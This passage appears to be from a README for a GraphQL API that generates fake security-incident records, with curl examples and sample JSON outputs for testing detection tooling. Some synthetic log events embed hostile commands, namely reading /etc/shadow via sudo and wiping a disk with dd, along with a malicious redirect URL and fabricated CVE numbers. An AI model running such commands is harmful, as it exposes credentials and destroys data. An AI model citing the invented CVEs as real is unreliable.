--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $fields: String!) {\n  generateFakeData(requestInput: {type: $type, fields: $fields}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"Incident","fields":"id,type,duration,analyst,severity,description"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                {
                    "id": 1,
                    "duration": 5,
                    "type": "Brute Force",
                    "analyst": "Jason",
                    "severity": 5,
                    "description": "Central Another Cup Campaign Relate. Various thousand explain. Truth site large far ready. Again herself student suddenly. Standard lead customer. Certain interesting themselves indicate happen last. Best work customer.."
                }
            ],
            "type": "FakerTypeEnum.Incident"
        }
    }
}
```

***
You can generate an incident with drill-down events, by selecting the events field.
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $fields: String!) {\n  generateFakeData(requestInput: {type: $type, fields: $fields}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"Incident","fields":"id,type,duration,analyst,severity,description,events"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                {
                    "id": 1,
                    "duration": 1,
                    "type": "Sql Injection",
                    "analyst": "Jennifer",
                    "severity": 4,
                    "description": "Always Room Free Baby Condition Laugh. Stuff minute agency form back. Especially maybe fight leader city. Of push carry student throw Democrat. Lose keep manager agreement. Position business live..",
                    "events": [
                        {
                            "event": "Jun 27 18:21:40 email-73.acosta.com sudo[38334]: bbuchanan : COMMAND ; cat /etc/shadow"
                        },
                        {
                            "event": "CEF:0|James and Sons|Firewall|1.0.0|ec317e47-94fe-45d8-b8d0-344c503863b5|2023-06-27 18:33:12.982174|Firewall Log FTP traffic from srv-33.sanchez-fletcher.com:51409 to ['106.52.200.13']:23176|8|src=srv-33.sanchez-fletcher.com spt=51409 dst=['106.52.200.13'] url=['http://www.blackwell.org/']dpt=23176 proto=FTP act=Log"
                        },
                        {
                            "event": "LEEF:1.0|Leef|Payment Portal|1.0|deviceEventDate=2023-06-27 18:51:00.054737|214.118.74.133|lt-47.strickland-baldwin.com|93:5b:35:e5:b3:b4|d5:59:06:fc:5a:7b|src=65.34.199.209 dst=lt-47.strickland-baldwin.com spt=7619 dpt=443 request=http://example.com/login.php method=Web-GET proto=HTTP/1.1 status=404 hash=['3c87db5e02d3038677e31d3b754075b1aa2969bc24241f9c9fed581e875edd1c']request_size=5666 response_size=4266 user_agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.1 (KHTML, like Gecko) Chrome/57.0.816.0 Safari/536.1"
                        },
                        {
                            "event": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"d9b2560f-ed15-4cfb-a829-a6946e6a6974\"/><EventID>10</EventID><Version>5</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2023-06-27 18:36:56.329943\"/><EventRecordID>356</EventRecordID><Correlation/><Execution ProcessID=\"9544\" ThreadID=\"664\" Channel=\"Microsoft-Windows-Sysmon/Operational\"/><EventData><Data Name=\"TargetImage\">C:\\Windows\\System32\\calc.exe</Data><Data Name=\"TargetPID\">3782</Data></EventData></Event>"
                        },
                        {
                            "event": {
                                "event_type": "vulnerability_discovered",
                                "timestamp": "Jun 27 17:58:53",
                                "severity": 3,
                                "host": "web-52.harris.org",
                                "file_hash": [
                                    "c3be242352e7c73e9506c25e21ae665c20be71ede23afe17c19c085ec13649c0"
                                ],
                                "cve": [
                                    "CVE-2681-4537"
                                ]
                            }
                        }
                    ]
                }
            ],
            "type": "FakerTypeEnum.Incident"
        }
    }
}
```

***
If you want to fake multiple incident entries, you can set the count input to an int.
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $count: Int!) {\n  generateFakeData(requestInput: {type: $type, count: $count}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"Incident","count":3}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 3,
            "data": [
                {
                    "id": 3,
                    "type": "Malware",
                    "duration": 5,
                    "analyst": "Kristin"
                },
                {
                    "id": 2,
                    "type": "Rogue Device",
                    "duration": 4,
                    "analyst": "James"
                },
                {
                    "id": 1,
                    "type": "Brute Force",
                    "duration": 5,
                    "analyst": "Mark"
                }
            ],
            "type": "FakerTypeEnum.Incident"
        }
    }
}
```

***
If you want to set an observables list to pick from, you can include the following observables in your list:
- incident_types 
- analysts
- severity
- terms
If you choose to include events with incidents, you can pass additional observables, please refer the above examples. 

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $observablesDict: JSON!, $fields: String!) {\n  generateFakeData(requestInput: {type: $type, observablesDict: $observablesDict, fields:$fields}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"Incident","observablesDict":{"incident_types":["phishing","malware"],"src_host":["host1","host2"]},"fields":"id,type,duration,analyst,severity,description,events"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                {
                    "id": 1,
                    "duration": 1,
                    "type": "malware",
                    "analyst": "Ricardo",
                    "severity": 1,
                    "description": "Home Remain Seat Successful Think Institution. Happy top middle important suffer recognize. Manage agency stay light. Once realize hard there turn. Similar half relate hope raise know authority. Edge property despite across..",
                    "events": [
                        {
                            "event": "Jun 27 19:47:09 host1 sudo[46469]: onewton : COMMAND ; dd if=/dev/zero of=/dev/sda"
                        },
                        {
                            "event": "CEF:0|Brewer Group|Firewall|1.0.9|be44dedd-4766-4579-a249-e183eff92d83|2023-06-27 18:59:22.058179|Firewall Wait SSL traffic from host2:20806 to ['103.67.163.140']:34939|10|src=host2 spt=20806 dst=['103.67.163.140'] url=['https://www.brown.com/']dpt=34939 proto=SSL act=Wait"
                        },
                        {
                            "event": "LEEF:1.0|Leef|Payment Portal|1.0|deviceEventDate=2023-06-27 19:24:05.991143|3.84.60.137|host2|b4:fe:3d:11:f8:99|53:97:02:66:45:ca|src=174.101.80.216 dst=host2 spt=34636 dpt=443 request=https://example.com/redirect.php?to=http://malicious.com method=Web-GET proto=HTTP/1.1 status=404 hash=['858fdd6bbb7be063810d0e5ad257ec80db49d34315252d713d375826457fab72']request_size=4320 response_size=4026 user_agent=Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.33.2 (KHTML, like Gecko) Version/5.1 Safari/533.33.2"
                        },
                        {
                            "event": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"5a8aee2a-60f0-4a73-80fc-17c3b32d0f32\"/><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>13824</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2023-06-27 19:14:30.266563\"/><EventRecordID>40</EventRecordID><Correlation/><Execution ProcessID=\"4614\" ThreadID=\"6384\" Channel=\"Security\"/><Computer>host1</Computer><Security UserID=\"S-1-7978\"/><EventData><Data Name=\"SubjectUserSid\">S-1-7978</Data><Data Name=\"SubjectUserName\">reginaldstevens</Data><Data Name=\"SubjectDomainName\">reed-parker.info</Data><Data Name=\"SubjectLogonId\">S-1-7978</Data><Data Name=\"NewProcessId\">1274</Data><Data Name=\"ProcessId\">4614</Data><Data Name=\"CommandLine\">net localgroup</Data><Data Name=\"TargetUserSid\">S-1-7978</Data><Data Name=\"TargetUserName\">reginaldstevens</Data><Data Name=\"TargetDomainName\">reed-parker.info</Data><Data Name=\"TargetLogonId\">S-1-7978</Data><Data Name=\"LogonType\">3</Data></EventData></Event>"
                        },
                        {
                            "event": {
                                "event_type": "vulnerability_discovered",
                                "timestamp": "Jun 27 19:03:05",
                                "severity": 1,
                                "host": "host2",
                                "file_hash": [
                                    "a20c4f598535edb96320b4a0f7173d8c65fca0d92695adf10a2661e0c5f549d6"
                                ],
                                "cve": [
                                    "CVE-5829-4062"
                                ]
                            }
                        }
                    ]
                }
            ],
            "type": "FakerTypeEnum.Incident"
        }
    }
}
```
***
